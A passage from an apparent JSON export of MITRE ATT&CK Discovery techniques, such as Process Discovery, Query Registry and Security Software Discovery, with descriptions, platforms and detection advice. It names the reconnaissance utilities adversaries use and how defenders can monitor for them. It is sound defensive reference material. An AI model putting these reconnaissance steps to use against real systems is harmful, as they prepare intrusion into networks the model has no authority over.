Discovery","sort_id":0,"external_id":"T1057","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software\/applications running on systems within the network. Adversaries may use the information from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1057\">Process Discovery<\/a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\/or attempts specific actions.<\/p>\n<p>In Windows environments, adversaries could obtain details on running processes using the <a href=\"https:\/\/attack.mitre.org\/software\/S0057\">Tasklist<\/a> utility via <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a> or <code>Get-Process<\/code> via <a href=\"https:\/\/attack.mitre.org\/techniques\/T1059\/001\">PowerShell<\/a>. Information about processes can also be extracted from the output of <a href=\"https:\/\/attack.mitre.org\/techniques\/T1106\">Native API<\/a> calls such as <code>CreateToolhelp32Snapshot<\/code>. In Mac and Linux, this is accomplished with the <code>ps<\/code> command. Adversaries may also opt to enumerate processes via \/proc.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":323,"platform_id":1,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":323,"platform_id":2,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":323,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":327,"name":"T1012 - Query Registry","sort_id":0,"external_id":"T1012","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.<\/p>\n<p>The Registry contains a significant amount of information about the operating system, configuration, software, and security.(Citation: Wikipedia Windows Registry) Information can easily be queried using the <a href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a> utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1012\">Query Registry<\/a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\/or attempts specific actions.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:01","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nInteraction with the Windows Registry may come from the command line using utilities such as [Reg](https:\/\/attack.mitre.org\/software\/S0075) or through running malware that may interact with the Registry through an API. Command-line invocation of utilities used to query the Registry may be detected through process and command-line monitoring. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":327,"platform_id":3,"created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01"}}]},{"id":338,"name":"T1018 - Remote System Discovery","sort_id":0,"external_id":"T1018","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for Lateral Movement from the current system. Functionality could exist within remote access tools to enable this, but utilities available on the operating system could also be used such as  <a href=\"https:\/\/attack.mitre.org\/software\/S0097\">Ping<\/a> or <code>net view<\/code> using <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a>. Adversaries may also use local host files (ex: <code>C:\\Windows\\System32\\Drivers\\etc\\hosts<\/code> or <code>\/etc\/hosts<\/code>) in order to discover the hostname to IP address mappings of remote systems. <\/p>\n<p>Specific to macOS, the <code>bonjour<\/code> protocol exists to discover additional Mac-based systems within the same broadcast domain.<\/p>\n<p>Within IaaS (Infrastructure as a Service) environments, remote systems include instances and virtual machines in various states, including the running or stopped state. Cloud providers have created methods to serve information about remote systems, such as APIs and CLIs. For example, AWS provides a <code>DescribeInstances<\/code> API within the Amazon EC2 API and a <code>describe-instances<\/code> command within the AWS CLI that can return information about all instances within an account.(Citation: Amazon Describe Instances API)(Citation: Amazon Describe Instances CLI) Similarly, GCP's Cloud SDK CLI provides the <code>gcloud compute instances list<\/code> command to list all Google Compute Engine instances in a project, and Azure's CLI <code>az vm list<\/code> lists details of virtual machines.(Citation: Google Compute Instances)(Citation: Azure VM List)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events related to legitimate remote system discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).\n\nIn cloud environments, the usage of particular commands or APIs to request information about remote systems may be common. Where possible, anomalous usage of these commands and APIs or the usage of these commands and APIs in conjunction with additional unexpected commands may be a sign of malicious use. Logging methods provided by cloud providers that capture history of CLI commands executed or API usage may be utilized for detection.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":338,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":338,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":338,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":338,"platform_id":6,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":338,"platform_id":7,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":338,"platform_id":8,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":353,"name":"T1063 - Security Software Discovery","sort_id":0,"external_id":"T1063","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of security software, configurations, defensive tools, and sensors that are installed on the system. This may include things such as local firewall rules and anti-virus. Adversaries may use the information from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1063\">Security Software Discovery<\/a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\/or attempts specific actions.<\/p>\n<h3>Windows<\/h3>\n<p>Example commands that can be used to obtain security software information are <a href=\"https:\/\/attack.mitre.org\/software\/S0108\">netsh<\/a>, <code>reg query<\/code> with <a href=\"https:\/\/attack.mitre.org\/software\/S0075\">Reg<\/a>, <code>dir<\/code> with <a href=\"https:\/\/attack.mitre.org\/software\/S0106\">cmd<\/a>, and <a href=\"https:\/\/attack.mitre.org\/software\/S0057\">Tasklist<\/a>, but other indicators of discovery behavior may be more specific to the type of software or security system the adversary is looking for.<\/p>\n<h3>Mac<\/h3>\n<p>It's becoming more common to see macOS malware perform checks for LittleSnitch and KnockKnock software.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":353,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":353,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":365,"name":"T1518 - Software Discovery","sort_id":0,"external_id":"T1518","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of software and software versions that are installed on a system or in a cloud environment. Adversaries may use the information from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1518\">Software Discovery<\/a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\/or attempts specific actions.<\/p>\n<p>Adversaries may attempt to enumerate software for a variety of reasons, such as figuring out what security measures are present or if the compromised system has a version of software that is vulnerable to <a href=\"https:\/\/attack.mitre.org\/techniques\/T1068\">Exploitation for Privilege Escalation<\/a>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":365,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":365,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":365,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":4,"name":"Office 365","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":365,"platform_id":4,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":5,"name":"Azure AD","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":365,"platform_id":5,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":365,"platform_id":6,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":365,"platform_id":7,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":365,"platform_id":8,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}},{"id":9,"name":"SaaS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":365,"platform_id":9,"created_at":"2020-07-28 16:02:20","updated_at":"2020-07-28 16:02:20"}}]},{"id":383,"name":"T1082 - System Information Discovery","sort_id":0,"external_id":"T1082","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1082\">System Information Discovery<\/a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\/or attempts specific actions.<\/p>\n<p>Tools such as <a href=\"https:\/\/attack.mitre.org\/software\/S0096\">Systeminfo<\/a> can be used to gather detailed system information. A breakdown of system data can also be gathered through the macOS <code>systemsetup<\/code> command, but it requires administrative privileges.<\/p>\n<p>Infrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":383,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":383,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":383,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":383,"platform_id":6,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":383,"platform_id":7,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":383,"platform_id":8,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":384,"name":"T1016 - System Network Configuration Discovery","sort_id":0,"external_id":"T1016","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may look for details about the network configuration and settings of systems they access or through information discovery of remote systems. Several operating system administration utilities exist that can be used to gather this information. Examples include <a href=\"https:\/\/attack.mitre.org\/software\/S0099\">Arp<\/a>, <a href=\"https:\/\/attack.mitre.org\/software\/S0100\">ipconfig<\/a>\/<a href=\"https:\/\/attack.mitre.org\/software\/S0101\">ifconfig<\/a>, <a href=\"https:\/\/attack.mitre.org\/software\/S0102\">nbtstat<\/a>, and <a href=\"https:\/\/attack.mitre.org\/software\/S0103\">route<\/a>.<\/p>\n<p>Adversaries may use the information from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1016\">System Network Configuration Discovery<\/a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\/or attempts specific actions.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":384,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":384,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":384,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":385,"name":"T1049 - System Network Connections Discovery","sort_id":0,"external_id":"T1049","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network. <\/p>\n<p>An adversary who gains access to a system that is part of a cloud-based environment may map out Virtual Private Clouds or Virtual Networks in order to determine what systems and services are connected. The actions performed are likely the same types of discovery techniques depending on the operating system, but the resulting information may include details about the networked cloud environment relevant to the adversary's goals. Cloud providers may have different ways in which their virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Microsoft Azure Virtual Network Overview)(Citation: Google VPC Overview)<\/p>\n<p>Utilities and commands that acquire this information include <a href=\"https:\/\/attack.mitre.org\/software\/S0104\">netstat<\/a>, &quot;net use,&quot; and &quot;net session&quot; with <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a>. In Mac and Linux, <a href=\"https:\/\/attack.mitre.org\/software\/S0104\">netstat<\/a> and <code>lsof<\/code> can be used to list current connections. <code>who -a<\/code> and <code>w<\/code> can be used to show which users are currently logged in, similar to &quot;net session&quot;.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":385,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":385,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":385,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":6,"name":"Azure","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":385,"platform_id":6,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":7,"name":"GCP","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":385,"platform_id":7,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":8,"name":"AWS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":385,"platform_id":8,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":386,"name":"T1033 - System Owner\/User Discovery","sort_id":0,"external_id":"T1033","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using <a href=\"https:\/\/attack.mitre.org\/techniques\/T1003\">OS Credential Dumping<\/a>. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file\/directory ownership, session information, and system logs. Adversaries may use the information from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1033\">System Owner\/User Discovery<\/a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\/or attempts specific actions.<\/p>\n<p>Utilities and commands that acquire this information include <code>whoami<\/code>. In Mac and Linux, the currently logged in user can be identified with <code>w<\/code> and <code>who<\/code>.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":1,"name":"Linux","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":386,"platform_id":1,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":2,"name":"macOS","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":386,"platform_id":2,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}},{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":386,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":387,"name":"T1007 - System Service Discovery","sort_id":0,"external_id":"T1007","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may try to get information about registered services. Commands that may obtain information about services using operating system utilities are &quot;sc,&quot; &quot;tasklist \/svc&quot; using <a href=\"https:\/\/attack.mitre.org\/software\/S0057\">Tasklist<\/a>, and &quot;net start&quot; using <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a>, but adversaries may also use other tools as well. Adversaries may use the information from <a href=\"https:\/\/attack.mitre.org\/techniques\/T1007\">System Service Discovery<\/a> during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and\/or attempts specific actions.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system information related to services. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https:\/\/attack.mitre.org\/techniques\/T1047) and [PowerShell](https:\/\/attack.mitre.org\/techniques\/T1059\/001).","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":387,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":389,"name":"T1124 - System Time Discovery","sort_id":0,"external_id":"T1124","external_sub_id":null,"old_external_id":null,"old_external_sub_id":null,"tactic_id":20,"description":"<p>An adversary may gather the system time and\/or time zone from a local or remote system. The system time is set and stored by the Windows Time Service within a domain to maintain time synchronization between systems and services in an enterprise network. (Citation: MSDN System Time) (Citation: Technet Windows Time Service)<\/p>\n<p>System time information may be gathered in a number of ways, such as with <a href=\"https:\/\/attack.mitre.org\/software\/S0039\">Net<\/a> on Windows by performing <code>net time \\hostname<\/code> to gather the system time on a remote system. The victim's time zone may also be inferred from the current system time or gathered by using <code>w32tm \/tz<\/code>. (Citation: Technet Windows Time Service) The information could be useful for performing other techniques, such as executing a file with a <a href=\"https:\/\/attack.mitre.org\/techniques\/T1053\">Scheduled Task\/Job<\/a> (Citation: RSA EU12 They're Inside), or to discover locality information based on time zone to assist in victim targeting.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:02","updated_at":"2020-07-28 16:02:20","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":"Command-line interface monitoring may be useful to detect instances of net.exe or other command-line utilities being used to gather system time or time zone. Methods of detecting API use for gathering this information are likely less useful due to how often they may be used by legitimate software.","platforms":[{"id":3,"name":"Windows","created_at":"2020-06-26 11:56:01","updated_at":"2020-06-26 11:56:01","pivot":{"technique_id":389,"platform_id":3,"created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02"}}]},{"id":456,"name":"T1420 - File and Directory Discovery","sort_id":0,"external_id":"T1420","external_sub_id":null,"old_external_id":"MOB-T1023","old_external_sub_id":null,"tactic_id":20,"description":"<p>On Android, command line tools or the Java file APIs can be used to enumerate file system contents. However, Linux file permissions and SELinux policies generally strongly restrict what can be accessed by apps (without taking advantage of a privilege escalation exploit). The contents of the external storage directory are generally visible, which could present concern if sensitive data is inappropriately stored there.<\/p>\n<p>iOS's security architecture generally restricts the ability to perform file and directory discovery without use of escalated privileges.<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":456,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":473,"name":"T1423 - Network Service Scanning","sort_id":0,"external_id":"T1423","external_sub_id":null,"old_external_id":"MOB-T1026","old_external_sub_id":null,"tactic_id":20,"description":"<p>Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation. Methods to acquire this information include port scans and vulnerability scans from the mobile device. This technique may take advantage of the mobile device's access to an internal enterprise network either through local connectivity or through a Virtual Private Network (VPN).<\/p>","is_deprecated":false,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03","is_detectable_by_common_defenses":null,"detectable_by_common_defenses_explanation":null,"difficulty_for_adversary":null,"difficulty_for_adversary_explanation":null,"detection":null,"platforms":[{"id":10,"name":"Android","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":473,"platform_id":10,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}},{"id":11,"name":"iOS","created_at":"2020-06-26 11:56:02","updated_at":"2020-06-26 11:56:02","pivot":{"technique_id":473,"platform_id":11,"created_at":"2020-06-26 11:56:03","updated_at":"2020-06-26 11:56:03"}}]},{"id":478,"name":"T1424 - Process 